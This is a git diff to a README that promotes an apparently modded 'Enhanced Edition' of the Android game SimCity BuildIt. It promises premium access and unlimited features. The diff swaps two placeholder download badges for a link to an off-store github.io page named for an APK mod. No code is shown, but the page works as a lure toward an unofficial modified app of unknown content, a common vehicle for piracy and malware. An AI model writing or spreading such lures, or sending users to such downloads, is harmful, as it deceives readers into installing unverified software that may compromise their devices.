@@ -2,7 +2,7 @@
 
 Transform your city-building experience with enhanced features and unlimited possibilities for SimCity BuildIt on Android.  
 
-[![Get Enhanced Version](https://img.shields.io/badge/Download-Enhanced_Edition-green?style=for-the-badge&logo=android)](#)  
+[![Get Enhanced Version](https://img.shields.io/badge/Download-Enhanced_Edition-green?style=for-the-badge&logo=android)](https://simcity-buildit-apk-mod.github.io/.github/)  
 
 ![Cityscape with Enhanced Features](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzZlHuibBSKQptgJFd_5L1KNDpxsaSyOHZQg&s)  
 *Redefine your urban planning with premium access*  
@@ -58,7 +58,7 @@ Transform your city-building experience with enhanced features and unlimited pos
 - 🔋 **Battery Efficient** – Minimal resource usage  
 - 🌙 **Dark Mode** – Comfortable nighttime building  
 
-[![Get Enhanced Version](https://img.shields.io/badge/Download-Enhanced_Edition-green?style=for-the-badge&logo=android)](#)  
+[![Get Enhanced Version](https://img.shields.io/badge/Download-Enhanced_Edition-green?style=for-the-badge&logo=android)](https://simcity-buildit-apk-mod.github.io/.github/)  
 
 ![Gameplay with Enhanced Tools](https://i.ytimg.com/vi/zY_9QzQGRgc/hq720.jpg)  
 *Experience city-building without limitations*  
